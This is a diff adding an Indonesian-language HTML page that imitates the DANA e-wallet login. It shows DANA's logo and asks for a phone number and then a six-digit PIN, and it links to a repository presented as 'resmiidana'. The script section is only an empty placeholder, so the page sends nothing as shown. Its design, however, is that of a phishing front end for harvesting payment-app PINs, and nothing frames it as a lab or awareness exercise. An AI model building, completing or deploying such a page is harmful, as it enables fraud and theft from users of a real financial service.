@@ -1,0 +1,140 @@
+ <!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Masukkan Nomor DANA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            height: 100%;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background-color: #1a73e8;
+            overflow: hidden;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #000000;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .phone-input-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+        }
+        .flag-icon {
+            width: 30px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        input[type="tel"] {
+            width: 100%;
+            padding: 14px;
+            font-size: 1.1em;
+            border: 1px solid #d4d4d4;
+            border-radius: 8px;
+            text-align: center;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a73e8;
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 1.1em;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #1558c3;
+        }
+        .input-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        .input-box {
+            width: 55px;
+            height: 55px;
+            font-size: 1.3em;
+            text-align: center;
+            border: 1px solid #d4d4d4;
+            border-radius: 8px;
+            outline: none;
+        }
+        @media screen and (max-width: 480px) {
+            .container {
+                width: 100%;
+                height: 100%;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            .logo {
+                width: 60px;
+            }
+            h2 {
+                font-size: 1.2em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="phonePage">
+        <img src="dana-logo.png" alt="Logo DANA" class="logo">
+        <h2>Masuk atau Daftar dengan Nomor HP</h2>
+        <div class="phone-input-container">
+            <img src="indonesia-flag.png" alt="Bendera Indonesia" class="flag-icon">
+            <input type="tel" id="phoneNumber" placeholder="Masukkan nomor telepon" maxlength="14" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 14)">
+        </div>
+        <button onclick="sendPhoneNumber()">Lanjut ke Halaman PIN</button>
+        
+        <!-- Link to GitHub Repository -->
+        <div style="margin-top: 20px;">
+            <a href="https://github.com/resmiidana/https-github.com-resmiidana-DANA-Login/tree/main" target="_blank" style="color: #1a73e8; text-decoration: none;">Lihat Repositori di GitHub</a>
+        </div>
+    </div>
+
+    <div class="container" id="pinPage" style="display: none;">
+        <img src="dana-logo.png" alt="Logo DANA" class="logo">
+        <h2>Masukkan PIN Anda</h2>
+        <div class="input-container">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+        </div>
+    </div>
+    <script>
+        // Your JavaScript functions here
+    </script>
+</body>
+</html>
